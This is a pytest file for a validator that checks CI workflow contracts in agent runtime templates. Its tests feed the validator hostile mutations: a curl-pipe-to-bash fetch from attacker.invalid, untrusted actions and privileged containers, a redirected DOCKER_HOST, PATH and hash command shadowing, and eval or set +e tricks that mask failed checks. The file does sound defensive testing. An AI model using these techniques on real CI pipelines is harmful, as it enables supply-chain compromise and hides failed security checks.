"""Tests for the static official runtime-template CI contract gate."""

from __future__ import annotations

import importlib.util
from pathlib import Path
import subprocess
import sys

import pytest


SCRIPT = Path(__file__).with_name("official_consumer_contract.py")
VERIFIER_REF = "".join(("11b8598e5c0b3f0b1031", "733a8d5f6bc238f146a4"))
CHECKOUT_REF = "".join(("de0fac2e4500dabe0009", "e67214ff5f5447ce83dd"))


def _load_module():
    spec = importlib.util.spec_from_file_location(
        "official_consumer_contract_tested", SCRIPT
    )
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


contract = _load_module()


def _workflow(*, verifier_ref: str = VERIFIER_REF) -> bytes:
    return f"""\
on: [push, pull_request]

permissions:
  contents: read

jobs:
  validate-static:
    runs-on: ubuntu-latest
    steps:
      - run: echo static
  t4-conformance:
    runs-on: docker-host
    needs: validate-static
    if: github.event.pull_request.head.repo.fork != true
    env:
      MOLECULE_CI_REF: {verifier_ref}
    steps:
      - uses: actions/checkout@{CHECKOUT_REF}
        with:
          persist-credentials: false
      - name: Prove management MCP in the final image
        run: |
          set -euo pipefail
          T4_TAG="t4-conformance-test:${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}"
          CI_ROOT="$RUNNER_TEMP/molecule-ci-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}"
          MCP_ATTESTATION="$RUNNER_TEMP/mcp-attestation-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}.json"
          MCP_ATTESTATION_TMP="${{MCP_ATTESTATION}}.tmp"
          MCP_ATTESTATION_SHA256="${{MCP_ATTESTATION}}.sha256"
          MCP_E2E_LOG="$RUNNER_TEMP/mcp-e2e-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}.log"
          MCP_VERIFY_CONTAINER="mcp-verify-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}"
          git init "$CI_ROOT"
          git -C "$CI_ROOT" remote add origin \
            https://git.moleculesai.app/molecule-ai/molecule-ci.git
          GIT_ASKPASS=/bin/false GIT_TERMINAL_PROMPT=0 \\
            git -c credential.helper= -c http.userAgent=curl/8.4.0 \\
            -C "$CI_ROOT" fetch --no-tags --depth 1 origin "$MOLECULE_CI_REF"
          git -C "$CI_ROOT" checkout -q --detach FETCH_HEAD
          test "$(git -C "$CI_ROOT" rev-parse HEAD)" = "$MOLECULE_CI_REF"
          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv "$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py
          python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py" --repo-root . --json \
            > "$MCP_ATTESTATION_TMP"
          mv "$MCP_ATTESTATION_TMP" "$MCP_ATTESTATION"
          sha256sum "$MCP_ATTESTATION" > "$MCP_ATTESTATION_SHA256"
          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv "$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py
          sha256sum --check "$MCP_ATTESTATION_SHA256"
          EXPECTED_RUNTIME_VERSION="$(python3 - "$CI_ROOT" "$MCP_ATTESTATION" <<'PY'
          import sys
          from pathlib import Path

          sys.path.insert(0, str(Path(sys.argv[1]) / "scripts"))
          from mcp_built_image_e2e import load_attestation

          with Path(sys.argv[2]).open("rb") as stream:
              sys.stdout.write(load_attestation(stream).runtime_version)
          PY
          )"
          docker build --build-arg RUNTIME_VERSION="$EXPECTED_RUNTIME_VERSION" \\
            -t "$T4_TAG" .
          docker create --interactive --name "$MCP_VERIFY_CONTAINER" \\
            --network none --user 1000:1000 --workdir /tmp \\
            --cap-drop ALL --security-opt no-new-privileges \\
            --pids-limit 128 --memory 768m --cpus 1 \\
            --tmpfs /tmp:size=64m --entrypoint python3 "$T4_TAG" \\
            /mcp_built_image_e2e.py
          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv "$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py
          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\
            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"
          sha256sum --check "$MCP_ATTESTATION_SHA256"
          docker start --attach --interactive "$MCP_VERIFY_CONTAINER" \\
            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG"
          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "$MCP_E2E_LOG"
          KEEP_T4_IMAGE=1
  validate:
    runs-on: ubuntu-latest
    needs: [t4-conformance]
    if: always()
    steps:
      - run: |
          set -euo pipefail
          t4="${{{{ needs.t4-conformance.result }}}}"
          if [ "$t4" != "success" ]; then
            exit 1
          fi
""".encode()


def _with_workflow_env(workflow: bytes, verifier_ref: str = VERIFIER_REF) -> bytes:
    return f"env:\n  MOLECULE_CI_REF: {verifier_ref}\n".encode() + workflow


def _test_contract(consumer: str, *, verifier_ref: str = VERIFIER_REF) -> bytes:
    prefix, suffix = verifier_ref[:32], verifier_ref[32:]
    common_body = """\
    workflow = yaml.safe_load(CI_WORKFLOW.read_text())
    workflow_ref = workflow["jobs"]["t4-conformance"]["env"]["MOLECULE_CI_REF"]
    build = workflow["jobs"]["t4-conformance"]
    required_fragments = (
        "GIT_ASKPASS=/bin/false",
        "credential.helper=",
        "http.userAgent=curl/8.4.0",
        "--no-tags",
        "--depth 1",
        'origin "$MOLECULE_CI_REF"',
        "mcp_pin_lockstep.py",
        "mcp_built_image_e2e.py",
        "--network none",
        "--user 1000:1000 --workdir /tmp",
        "--cap-drop ALL --security-opt no-new-privileges",
        "--pids-limit 128 --memory 768m --cpus 1",
        "--tmpfs /tmp:size=64m",
        "mcp-built-image-e2e:sentinel:executed",
    )
    assert workflow_ref == MOLECULE_CI_REF
    assert FORK_RUN in build
    for fragment in required_fragments:
        assert fragment in build
    assert "--volume" not in build
"""
    if consumer == "hermes":
        functions = f"""\
def test_t4_fetches_exact_molecule_ci_and_generates_attestation():
    assert MOLECULE_CI_REF
    assert "mcp_pin_lockstep.py"

def test_t4_runs_hardened_final_image_mcp_e2e_before_privileged_probe():
{common_body}
"""
    else:
        functions = f"""\
def test_t4_runs_immutable_offline_mcp_verifier_against_same_final_image():
{common_body}
"""
    return (
        "import yaml\n"
        "from pathlib import Path\n\n"
        "CI_WORKFLOW = Path('.gitea/workflows/ci.yml')\n"
        "FORK_RUN = 'github.event.pull_request.head.repo.fork != true'\n"
        "MOLECULE_CI_REF = ''.join((\""
        + prefix
        + '", "'
        + suffix
        + '"))\n\n'
        + functions
    ).encode()


@pytest.mark.parametrize("consumer", ("claude-code", "codex", "openclaw", "hermes"))
def test_valid_official_contract_is_accepted(consumer: str) -> None:
    contract.validate_contract(consumer, _workflow(), _test_contract(consumer))


def test_duplicate_yaml_mapping_keys_fail_closed() -> None:
    workflow = _workflow().replace(
        b"    runs-on: docker-host\n",
        b"    runs-on: ubuntu-latest\n    runs-on: docker-host\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="duplicate YAML mapping key"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "replacement",
    (b"on: [push]", b"on: [pull_request]"),
)
def test_proof_workflow_must_run_on_push_and_pull_request(
    replacement: bytes,
) -> None:
    workflow = _workflow().replace(b"on: [push, pull_request]", replacement, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="push and pull_request"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_proof_job_must_run_on_a_docker_host() -> None:
    workflow = _workflow().replace(
        b"    runs-on: docker-host\n", b"    runs-on: ubuntu-latest\n", 1
    )

    with pytest.raises(contract.OfficialConsumerContractError, match="docker-host"):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_t4_proof_job_name_is_semantically_required() -> None:
    workflow = _workflow().replace(b"  t4-conformance:\n", b"  decoy-conformance:\n", 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="t4-conformance proof job"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_t4_proof_must_reach_a_downstream_required_aggregate() -> None:
    workflow = _workflow().replace(
        b"    needs: [t4-conformance]\n",
        b"    needs: [validate-static]\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="downstream aggregate"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_t4_proof_must_reach_an_unconditional_always_aggregate() -> None:
    workflow = _workflow().replace(b"    if: always()\n", b"", 1)
    assert workflow != _workflow()

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="unconditional always aggregate",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_t4_dependency_graph_cannot_hide_the_proof_in_a_cycle() -> None:
    workflow = _workflow().replace(
        b"    needs: validate-static\n",
        b"    needs: [validate-static, validate]\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="dependency cycle"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_always_aggregate_must_enforce_the_t4_result() -> None:
    enforced = (
        b"      - run: |\n"
        b"          set -euo pipefail\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n'
        b'          if [ "$t4" != "success" ]; then\n'
        b"            exit 1\n"
        b"          fi\n"
    )
    workflow = _workflow().replace(
        enforced, b"      - run: echo aggregate-without-enforcement\n", 1
    )
    assert workflow != _workflow()

    with pytest.raises(
        contract.OfficialConsumerContractError, match="does not enforce"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_always_aggregate_assertion_step_must_be_unconditional() -> None:
    workflow = _workflow().replace(
        b"      - run: |\n"
        b"          set -euo pipefail\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        b"      - if: ${{ false }}\n"
        b"        run: |\n"
        b"          set -euo pipefail\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="aggregate.*unconditional"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement"),
    (
        (
            b"    runs-on: ubuntu-latest\n    needs: [t4-conformance]\n",
            b"    runs-on: ubuntu-latest\n"
            b"    defaults:\n"
            b"      run:\n"
            b"        shell: bash {0} || true\n"
            b"    needs: [t4-conformance]\n",
        ),
        (
            b"    needs: [t4-conformance]\n",
            b"    needs: [t4-conformance]\n"
            b"    env:\n"
            b"      BASH_ENV: /tmp/mask-failure.sh\n",
        ),
        (
            b"    if: always()\n    steps:\n      - run: |\n",
            b"    if: always()\n"
            b"    steps:\n"
            b"      - uses: attacker/prepare-mask@main\n"
            b"      - run: |\n",
        ),
    ),
)
def test_always_aggregate_has_an_isolated_execution_boundary(
    needle: bytes, replacement: bytes
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)
    assert workflow != _workflow()

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="always aggregate execution boundary",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_always_aggregate_cannot_disable_failure_propagation() -> None:
    enforced = (
        b"      - run: |\n"
        b"          set -euo pipefail\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n'
        b'          if [ "$t4" != "success" ]; then\n'
        b"            exit 1\n"
        b"          fi\n"
    )
    masked = (
        b"      - run: |\n"
        b"          set -euo pipefail\n"
        b"          set +e\n"
        b'          test "${{ needs.t4-conformance.result }}" = success\n'
        b"          true\n"
    )
    workflow = _workflow().replace(enforced, masked, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "mutation",
    (
        b'          t4="success"\n',
        b'          echo "${t4:=success}"\n',
    ),
)
def test_always_aggregate_result_binding_cannot_be_rewritten(mutation: bytes) -> None:
    workflow = _workflow().replace(
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        b'          t4="${{ needs.t4-conformance.result }}"\n' + mutation,
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_always_aggregate_cannot_shadow_exit_with_alternate_function_syntax() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        b"          set -euo pipefail\n"
        b"          function exit { command true; }\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsupported shell function"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_always_aggregate_rejects_a_case_arm_exit_shadow() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        b"          set -euo pipefail\n"
        b"          case 1 in\n"
        b"            1) function exit { command true; } ;;\n"
        b"          esac\n"
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsupported case control"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_always_aggregate_cannot_hide_state_mutation_after_a_command_separator() -> None:
    workflow = _workflow().replace(
        b'          t4="${{ needs.t4-conformance.result }}"\n',
        b'          t4="${{ needs.t4-conformance.result }}"\n'
        b"          :; eval 't4=success'\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def _workflow_with_exact_aggregate_fork_carveout() -> bytes:
    direct = (
        b'          if [ "$t4" != "success" ]; then\n            exit 1\n          fi\n'
    )
    carveout = (
        b"          is_fork_pr=\"${{ github.event_name == 'pull_request' && "
        b'github.event.pull_request.head.repo.fork == true }}"\n'
        b'          if [ "$t4" != "success" ]; then\n'
        b'            if [ "$t4" = "skipped" ] && [ "$is_fork_pr" = "true" ]; then\n'
        b'              echo "::notice::fork-only skip"\n'
        b"            else\n"
        b"              exit 1\n"
        b"            fi\n"
        b"          fi\n"
    )
    workflow = _workflow().replace(direct, carveout, 1)
    assert workflow != _workflow()
    return workflow


def test_always_aggregate_allows_only_the_exact_fork_skip_carveout() -> None:
    contract.validate_contract(
        "codex", _workflow_with_exact_aggregate_fork_carveout(), _test_contract("codex")
    )


def test_always_aggregate_rejects_a_forged_fork_skip_binding() -> None:
    workflow = _workflow_with_exact_aggregate_fork_carveout().replace(
        b"is_fork_pr=\"${{ github.event_name == 'pull_request' && "
        b'github.event.pull_request.head.repo.fork == true }}"',
        b'is_fork_pr="true"',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_t4_runner_labels_cannot_make_the_proof_unschedulable() -> None:
    workflow = _workflow().replace(
        b"    runs-on: docker-host\n",
        b"    runs-on: [docker-host, never-scheduled]\n",
        1,
    )

    with pytest.raises(contract.OfficialConsumerContractError, match="runner labels"):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement", "message"),
    (
        (
            f"actions/checkout@{CHECKOUT_REF}".encode(),
            b"actions/checkout@main",
            "immutable allowlisted action",
        ),
        (
            b"          persist-credentials: false",
            b"          persist-credentials: true",
            "persist-credentials",
        ),
        (
            b"      - uses: actions/checkout@" + CHECKOUT_REF.encode() + b"\n",
            b"      - uses: actions/checkout@"
            + CHECKOUT_REF.encode()
            + b"\n        if: github.event.pull_request.head.repo.fork != true\n",
            "unconditional",
        ),
        (
            b"      - name: Prove management MCP in the final image\n",
            b"      - uses: attacker/action@main\n"
            b"      - name: Prove management MCP in the final image\n",
            "immutable allowlisted action",
        ),
    ),
)
def test_t4_actions_are_immutable_allowlisted_and_credential_free(
    needle: bytes, replacement: bytes, message: str
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(contract.OfficialConsumerContractError, match=message):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement", "message"),
    (
        (
            b"permissions:\n  contents: read\n\n",
            b"",
            "contents: read permissions",
        ),
        (
            b"permissions:\n  contents: read",
            b"permissions:\n  contents: write",
            "contents: read permissions",
        ),
        (
            b"    runs-on: docker-host\n",
            b"    runs-on: docker-host\n    permissions:\n      contents: write\n",
            "contents: read permissions",
        ),
        (
            b"    runs-on: docker-host\n",
            b"    runs-on: docker-host\n    container: attacker/image:latest\n",
            "container or services",
        ),
        (
            b"    runs-on: docker-host\n",
            b"    runs-on: docker-host\n"
            b"    services:\n"
            b"      daemon:\n"
            b"        image: attacker/image:latest\n",
            "container or services",
        ),
    ),
)
def test_t4_job_keeps_a_least_privilege_runner_boundary(
    needle: bytes, replacement: bytes, message: str
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(contract.OfficialConsumerContractError, match=message):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement"),
    (
        (
            b"jobs:\n",
            b"env:\n  PATH: /tmp/untrusted-bin\n\njobs:\n",
        ),
        (
            b"jobs:\n",
            b"env:\n  GITHUB_SERVER_URL: https://attacker.invalid\n\njobs:\n",
        ),
        (
            b"      MOLECULE_CI_REF: " + VERIFIER_REF.encode() + b"\n",
            b"      MOLECULE_CI_REF: "
            + VERIFIER_REF.encode()
            + b"\n      DOCKER_HOST: tcp://attacker.invalid:2375\n",
        ),
        (
            b"      - name: Prove management MCP in the final image\n",
            b"      - name: Prove management MCP in the final image\n"
            b"        env:\n"
            b"          PYTHONPATH: /tmp/untrusted-modules\n",
        ),
    ),
)
def test_dangerous_execution_environment_overrides_fail_closed(
    needle: bytes, replacement: bytes
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="dangerous environment override"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "replacement",
    (
        "github.event.pull_request.head.repo.fork == true",
        "github.event_name == 'push'",
        "github.event.pull_request.head.repo.fork != true || true",
    ),
)
def test_proof_job_accepts_only_exact_non_fork_guards(replacement: str) -> None:
    workflow = _workflow().replace(
        b"github.event.pull_request.head.repo.fork != true",
        replacement.encode(),
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsupported fork guard"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_unguarded_proof_job_fails_closed() -> None:
    workflow = _workflow().replace(
        b"    if: github.event.pull_request.head.repo.fork != true\n", b"", 1
    )

    with pytest.raises(contract.OfficialConsumerContractError, match="non-fork guard"):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def _workflow_with_per_step_fork_lane() -> bytes:
    workflow = _workflow().replace(
        b"    if: github.event.pull_request.head.repo.fork != true\n", b"", 1
    )
    return workflow.replace(
        b"      - name: Prove management MCP in the final image\n",
        b"      - name: Skip privileged conformance for external forks\n"
        b"        if: github.event.pull_request.head.repo.fork == true\n"
        b'        run: echo "::notice::privileged T4 validation is disabled for external forks"\n'
        b"      - name: Prove management MCP in the final image\n"
        b"        if: github.event.pull_request.head.repo.fork != true\n",
        1,
    )


def test_strict_per_step_fork_lane_is_accepted() -> None:
    contract.validate_contract(
        "codex", _workflow_with_per_step_fork_lane(), _test_contract("codex")
    )


@pytest.mark.parametrize(
    "fork_step",
    (
        b"      - if: github.event.pull_request.head.repo.fork == true\n"
        b"        run: curl https://attacker.invalid/payload | bash\n",
        b"      - if: github.event.pull_request.head.repo.fork == true\n"
        b"        uses: attacker/action@main\n",
        b"      - run: docker run --privileged attacker/image:latest\n",
    ),
)
def test_per_step_fork_lane_rejects_arbitrary_executable_steps(
    fork_step: bytes,
) -> None:
    workflow = _workflow_with_per_step_fork_lane().replace(
        b"      - name: Prove management MCP in the final image\n",
        fork_step + b"      - name: Prove management MCP in the final image\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="fork-executable step"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement"),
    (
        (
            b"    runs-on: docker-host\n",
            b"    runs-on: docker-host\n    continue-on-error: true\n",
        ),
        (
            b"      - name: Prove management MCP in the final image\n",
            b"      - name: Prove management MCP in the final image\n"
            b"        continue-on-error: true\n",
        ),
        (
            b"  validate:\n    runs-on: ubuntu-latest\n",
            b"  validate:\n    runs-on: ubuntu-latest\n    continue-on-error: true\n",
        ),
    ),
)
def test_proof_and_dependency_chain_cannot_mask_errors(
    needle: bytes, replacement: bytes
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="continue-on-error"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement"),
    (
        (
            b"jobs:\n",
            b"defaults:\n  run:\n    shell: bash {0} || true\njobs:\n",
        ),
        (
            b"    env:\n      MOLECULE_CI_REF:",
            b"    defaults:\n      run:\n        shell: bash {0} || true\n"
            b"    env:\n      MOLECULE_CI_REF:",
        ),
        (
            b"      - name: Prove management MCP in the final image\n",
            b"      - name: Prove management MCP in the final image\n"
            b"        shell: bash {0} || true\n",
        ),
    ),
)
def test_custom_shell_wrappers_cannot_mask_the_proof(
    needle: bytes, replacement: bytes
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(contract.OfficialConsumerContractError, match="custom shell"):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_required_commands_in_comments_do_not_count_as_execution() -> None:
    command = (
        b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\\n'
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n'
    )
    workflow = _workflow().replace(
        command,
        b"          # docker cp verifier decoy only\n"
        b"          # docker cp $CI_ROOT/scripts/mcp_built_image_e2e.py "
        b"$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py\n"
        b"          echo verifier-not-copied\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="ordered executable proof",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("prefix", "suffix"),
    (
        (b"          cat <<'DECOY'\n", b"          DECOY\n"),
        (b"          unused_copy() {\n", b"          }\n"),
        (b"          if false; then\n", b"          fi\n"),
    ),
)
def test_required_commands_in_inert_shell_regions_do_not_count(
    prefix: bytes, suffix: bytes
) -> None:
    command = (
        b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\\n'
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n'
    )
    workflow = _workflow().replace(command, prefix + command + suffix, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="ordered executable proof",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_required_command_in_multiline_inert_control_flow_does_not_count() -> None:
    command = (
        b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\\n'
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n'
    )
    workflow = _workflow().replace(
        command,
        b"          if false\n          then\n" + command + b"          fi\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="ordered executable proof",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_every_split_proof_stage_must_run_under_the_non_fork_guard() -> None:
    command = (
        b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\\n'
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n'
    )
    replacement = (
        b"      - name: Fork-only verifier copy\n"
        b"        if: github.event.pull_request.head.repo.fork == true\n"
        b"        run: |\n"
        b"          set -euo pipefail\n"
        + command
        + b"      - name: Continue final-image proof\n"
        b"        run: |\n"
        b"          set -euo pipefail\n"
    )
    workflow = _workflow().replace(command, replacement, 1)

    with pytest.raises(contract.OfficialConsumerContractError, match="non-fork guard"):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_final_image_proof_commands_must_be_ordered() -> None:
    copy_block = (
        b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\\n'
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n'
    )
    start_block = (
        b'          docker start --attach --interactive "$MCP_VERIFY_CONTAINER" \\\n'
        b'            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG"\n'
    )
    seal_check = b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n'
    workflow = _workflow().replace(
        copy_block + seal_check + start_block,
        start_block + copy_block + seal_check,
        1,
    )
    assert workflow != _workflow()

    with pytest.raises(
        contract.OfficialConsumerContractError, match="ordered executable proof"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_exact_ref_fetch_cannot_be_masked_inside_an_if_condition() -> None:
    fetch = (
        b"          GIT_ASKPASS=/bin/false GIT_TERMINAL_PROMPT=0 \\\n"
        b"            git -c credential.helper= -c http.userAgent=curl/8.4.0 \\\n"
        b'            -C "$CI_ROOT" fetch --no-tags --depth 1 origin "$MOLECULE_CI_REF"\n'
    )
    masked = (
        b"          if GIT_ASKPASS=/bin/false GIT_TERMINAL_PROMPT=0 \\\n"
        b"            git -c credential.helper= -c http.userAgent=curl/8.4.0 \\\n"
        b'            -C "$CI_ROOT" fetch --no-tags --depth 1 origin '
        b'"$MOLECULE_CI_REF"; true; then\n'
        b"            :\n"
        b"          fi\n"
    )
    workflow = _workflow().replace(fetch, masked, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="masks|required command"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "relaxation",
    (
        b"set +e",
        b"set +u",
        b"set +o pipefail",
        b"builtin set +e",
    ),
)
def test_proof_cannot_relax_fail_closed_shell_mode(relaxation: bytes) -> None:
    workflow = _workflow().replace(
        b"          docker start --attach --interactive",
        b"          " + relaxation + b"\n          docker start --attach --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="relaxes fail-closed shell mode"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_proof_cannot_relax_fail_closed_mode_after_a_command_separator() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          :; set +e\n          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="relaxes fail-closed shell mode"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_post_sentinel_probe_can_manage_its_own_expected_failure() -> None:
    workflow = _workflow().replace(
        b"          KEEP_T4_IMAGE=1\n",
        b"          KEEP_T4_IMAGE=1\n"
        b"          set +e\n"
        b"          false\n"
        b"          set -e\n",
        1,
    )

    contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_proof_cannot_shadow_required_commands_through_path() -> None:
    workflow = _workflow().replace(
        b'          git init "$CI_ROOT"\n',
        b'          PATH="/tmp/untrusted-bin:$PATH"\n          git init "$CI_ROOT"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="dangerous environment override"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_proof_cannot_shadow_required_commands_with_builtin_hash() -> None:
    workflow = _workflow().replace(
        b'          git init "$CI_ROOT"\n',
        b"          builtin hash -p /tmp/attacker/git git\n"
        b'          git init "$CI_ROOT"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dangerous environment override",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_proof_cannot_hide_builtin_hash_after_a_command_separator() -> None:
    workflow = _workflow().replace(
        b'          git init "$CI_ROOT"\n',
        b"          :; builtin hash -p /tmp/attacker/git git\n"
        b'          git init "$CI_ROOT"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dangerous environment override",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement"),
    (
        (
            b'            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG"\n',
            b'            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG" || echo ignored\n',
        ),
        (
            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
            b'"$MCP_E2E_LOG"\n',
            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
            b'"$MCP_E2E_LOG" || echo ignored\n',
        ),
    ),
)
def test_verifier_start_and_sentinel_cannot_use_arbitrary_error_masking(
    needle: bytes, replacement: bytes
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="verifier start|sentinel assertion|masks a required command",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_sentinel_must_assert_the_exact_verifier_output_log() -> None:
    workflow = (
        _workflow()
        .replace(
            b'          MCP_E2E_LOG="$RUNNER_TEMP/mcp-e2e-',
            b'          MCP_OTHER_LOG="$RUNNER_TEMP/mcp-other.log"\n'
            b'          MCP_E2E_LOG="$RUNNER_TEMP/mcp-e2e-',
            1,
        )
        .replace(
            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
            b'"$MCP_E2E_LOG"\n',
            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
            b'"$MCP_OTHER_LOG"\n',
            1,
        )
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="different verifier log"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "replacement",
    (
